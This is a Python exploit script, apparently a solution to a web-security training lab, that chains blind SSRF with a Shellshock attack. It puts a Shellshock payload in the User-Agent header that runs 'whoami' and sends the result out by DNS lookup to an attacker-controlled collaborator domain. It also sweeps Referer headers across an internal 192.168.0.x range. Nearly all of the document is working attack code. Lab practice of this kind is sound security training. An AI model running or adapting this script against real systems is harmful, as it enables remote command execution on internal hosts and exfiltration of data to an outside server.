# Blind SSRF with Shellshock exploitation

import requests, sys, urllib3, re, time, warnings

warnings.filterwarnings("ignore", category=DeprecationWarning)
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

proxies = {'http': 'http://127.0.0.1:8080', 'https': 'http://127.0.0.1:8080'}

product_path = '/product?productId=1'


def send_ssrf(url, collab):
	product_url = url + product_path
	user_agent = "() { :; }; /bin/nslookup $(whoami)." + collab
	print('[+] User-Agent:\t%s' % user_agent)
	for i in range(1, 256):
		sys.stdout.flush()
		headers = {"Referer": "http://192.168.0." + str(i) + ':8080', "User-Agent": user_agent}
		r = requests.get(product_url, headers=headers, verify=False, proxies=proxies)
		sys.stdout.write("\r[+] Referer:\thttp://192.168.0.%s:8080" % str(i))
	sys.stdout.flush()
	print("\n[+] You should Poll Now your collaborator and see a DNS request...")
	print("[+] Check the subdomain of the sender and get the result of whoami command...")
	print("[+] Grab it and submit it...")
	
def show_usage():
	print("[+] Usage: %s <URL> <COLLAB>" % sys.argv[0])
	print('[+] Example: %s www.example.com xxxxxxxx.oastify.com' % sys.argv[0])
	sys.exit(-1)

def main():
	print('[+] Lab: Blind SSRF with Shellshock exploitation')
	try:
		url = sys.argv[1].strip()
		collab = sys.argv[2].strip()
	except IndexError:
		show_usage()
	r = requests.get(url, allow_redirects=False, verify=False, proxies=proxies)
	time.sleep(1)
	if '<h1>Error</h1>' in r.text or 'Server Error: Gateway Timeout' in r.text:
		print('\n[-] HOST seems to be down (or proxy missconfigued) <!>')
		sys.exit(-1)
	else:
		print("\n[+] Sending Blind SSRF via the 'Referer' header and ShellShock attack via 'User-Agent'...")
		send_ssrf(url, collab)

if __name__ == "__main__":
	main()